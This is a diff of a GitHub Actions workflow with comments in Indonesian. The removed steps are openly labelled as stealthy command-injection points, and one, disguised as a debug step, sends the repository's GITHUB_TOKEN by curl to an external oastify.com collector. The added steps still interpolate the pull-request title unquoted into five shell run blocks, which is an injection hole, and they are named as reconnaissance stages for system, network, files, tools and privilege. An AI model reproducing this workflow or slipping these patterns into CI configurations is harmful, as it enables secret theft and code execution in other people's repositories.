@@ -10,33 +10,37 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
       
-      # STEP 1: Vulnerable command injection point (kelihatan innocent)
-      - name: Setup environment
+      # STEP 1: Informasi Sistem & OS
+      - name: System & OS Info
         run: |
-          echo "PR: ${{ github.event.pull_request.title }}"
-          echo "Repo: ${{ github.repository }}"
+          echo "===== SYSTEM & OS ====="
+          echo "PR Title: ${{ github.event.pull_request.title }}"
+          echo ""
       
-      # STEP 2: Hidden injection point (pake variable yang gak kelihatan)
-      - name: Cache dependencies
+      # STEP 2: Identifikasi Jaringan
+      - name: Network Info
         run: |
-          CACHE_KEY="${{ github.event.pull_request.head.ref }}"
-          echo "Cache key: $CACHE_KEY"
+          echo "===== NETWORK ====="
+          echo "PR Title: ${{ github.event.pull_request.title }}"
+          echo ""
       
-      # STEP 3: Multi-line injection (paling stealth)
-      - name: Build
+      # STEP 3: Akses Direktori & File
+      - name: Directory & File Info
         run: |
-          # This is a normal build step
-          npm install
-          npm test
-          # PR metadata injection point
-          PR_METADATA="${{ github.event.pull_request.body }}"
-          echo "PR metadata processed"
+          echo "===== DIRECTORY & FILE ====="
+          echo "PR Title: ${{ github.event.pull_request.title }}"
+          echo ""
       
-      # STEP 4: Exfiltration point (kelihatan kayak debug)
-      - name: Debug info
+      # STEP 4: Menemukan Program/Tools
+      - name: Tools Info
         run: |
-          echo "Debug: PR#${{ github.event.pull_request.number }}"
-          echo "Actor: ${{ github.actor }}"
-          # Hidden exfiltration
-          curl -s -X POST -d "token=${{ secrets.GITHUB_TOKEN }}" \
-            https://h4mw4z2o2fz79os0ttbl1brw0n6iu8ix.oastify.com/collect 2>/dev/null || true
+          echo "===== TOOLS ====="
+          echo "PR Title: ${{ github.event.pull_request.title }}"
+          echo ""
+      
+      # STEP 5: Memeriksa Privilege
+      - name: Privilege Info
+        run: |
+          echo "===== PRIVILEGE ====="
+          echo "PR Title: ${{ github.event.pull_request.title }}"
+          echo ""
